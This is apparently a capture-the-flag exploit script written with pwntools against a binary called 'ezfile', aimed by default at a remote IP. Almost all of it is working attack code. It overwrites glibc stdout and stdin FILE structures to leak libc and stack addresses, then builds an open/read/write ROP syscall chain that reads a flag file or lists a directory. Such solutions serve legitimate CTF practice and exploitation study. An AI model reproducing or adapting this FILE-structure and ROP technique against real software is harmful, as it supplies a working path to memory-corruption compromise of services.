#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11106 ./chall
from pwn import *
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
# host = args.HOST or 'localhost'
# port = int(args.PORT or 11102)

host = args.HOST or '165.22.101.113'
port = int(args.PORT or 11102)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *edit+152
# b *add+77
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def add():
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(0x200000))
    io.sendafter(": ","a")

def edit(start,msg):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(start))
    io.sendafter(": ",msg)

libc = ELF("./libc-2.27.so")

idx_stdout  = libc.sym["_IO_2_1_stdout_"]
idx_stdin   = libc.sym["_IO_2_1_stdin_"]

add()

p = ''
p+= p64(0xfbad1800)[1:] # _flags
p+= p64(0) # _IO_read_ptr
p+= p64(0) # _IO_read_end
p+= p64(0) # _IO_read_base
p+= b'\x08' # _IO_write_ptr

edit(0x201000-0x10+idx_stdout+1, p)

leak 			= u64(io.recv(6).ljust(8,b"\x00"))
libc.address 	= leak - 0x3ed8b0
environ     	= libc.sym['environ']

print "LIBC leak: " + hex(leak)
print "LIBC base: " + hex(libc.address)

pop_rdi = libc.address + 0x00000000000215bf
pop_rsi = libc.address + 0x0000000000023eea
pop_rdx = libc.address + 0x0000000000001b96
pop_rax = libc.address + 0x0000000000043ae8
syscall_ret = next(libc.search(asm("syscall ; ret")))

def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx)
    chain += p64(syscall_ret)
    return chain

p = ''
# p+= p64(0xfbad1800) # _flags
# p+= p64(0) # _IO_read_ptr
p+= p64(environ) # _IO_read_end
p+= p64(0) # _IO_read_base
p+= p64(environ) # _IO_write_base
p+= p64(environ+8) # _IO_write_ptr
edit(0x201000-0x10+idx_stdout+16,p)

stack = u64(io.recv(8))
print hex(stack)
to_stack = stack - 0x110
print hex(to_stack)

p = ''
p += p64(to_stack) # _IO_buf_base
p += p64(to_stack + 0x2000) # _IO_buf_end, len 0x2000 bytes

edit(0x201000-0x10+idx_stdin+56,p)

size=0x100
read=1

if read:
    p = syscall(257, 0xffffffffffffff9c, to_stack+216, 0)
    p += syscall(0, 3, to_stack-size, size)
    p += syscall(1, 1, to_stack-size, size)
    # p += './flag.txt'.ljust(40,"\x00")
    p += '/home/ezfile/flag-c5bb96364f4b6f4c2fea077655c48304.txt'.ljust(40,"\x00")
else:
    p = syscall(257, 0xffffffffffffff9c, to_stack+288, 0)
    p += syscall(78, 3, to_stack-size, size)
    p += syscall(0, 3, to_stack-size, size)
    p += syscall(1, 1, to_stack-size, size)
    # p += '/home/ezfile1/'.ljust(40,"\x00")
    p += './'.ljust(40,"\x00")

io.sendafter("> ",p)


io.interactive()
